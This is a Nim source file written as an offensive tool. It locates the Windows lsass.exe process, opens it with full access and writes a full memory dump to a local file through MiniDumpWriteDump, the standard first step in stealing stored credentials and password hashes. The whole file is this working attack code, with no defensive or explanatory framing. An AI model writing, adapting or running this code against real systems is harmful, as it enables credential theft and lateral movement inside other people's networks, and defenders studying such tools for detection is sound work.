import winim
import std/strformat

type
    MINIDUMP_TYPE = enum
        MiniDumpWithFullMemory = 0x00000002

proc MiniDumpWriteDump(
    hProcess: HANDLE,
    ProcessId: DWORD,
    hFile: HANDLE,
    DumpType: MINIDUMP_TYPE,
    ExceptionParam: INT,
    UserStreamParam: INT,
    CallbackParam: INT
): BOOL {.importc: "MiniDumpWriteDump", dynlib: "dbghelp", stdcall.}

proc toString(chars: openArray[WCHAR]): string =
    result = ""
    for c in chars:
        if cast[char](c) == '\0':
            break
        result.add(cast[char](c))

proc GetLsassPid(): int =
    var
        entry: PROCESSENTRY32
        hSnapshot: HANDLE

    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer: CloseHandle(hSnapshot)

    if Process32First(hSnapshot, addr entry):
        while Process32Next(hSnapshot, addr entry):
            if entry.szExeFile.toString == "lsass.exe":
                return int(entry.th32ProcessID)

    return 0

proc LSASSDump() =

    var lsassProcess: HANDLE
    var lsassPID: int = GetLsassPid();

    echo lsassPID

    var DumpFile: HANDLE = CreateFileA("dumpfile.dmp", GENERIC_ALL,
            FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, cast[
                    HANDLE](NULL))
    if bool(DumpFile) == FALSE:
        echo fmt"[!] Error creating dump file! {GetLastError()}\n"
        quit(-1);

    echo "[+] Dump file created successfully!\n"

    lsassProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, lsassPID.DWORD)
    if bool(lsassProcess) == FALSE:
        echo "[!] Couldn't open LSASS Process! {GetLastError()}\n"
        quit(-1)

    echo "[+] Got a handle to the LSASS Process!\n"

    var ProcDump: BOOL = MiniDumpWriteDump(lsassProcess, lsassPID.DWORD,
            DumpFile, MiniDumpWithFullMemory, 0, 0, 0)
    if bool(ProcDump) == FALSE:
        echo "[!] Error while calling MiniDumpWriteDump()\n {GetLastError()}"
        quit(-1);

    echo "[+] Successfully conducted memory dump!\n";

LSASSDump()
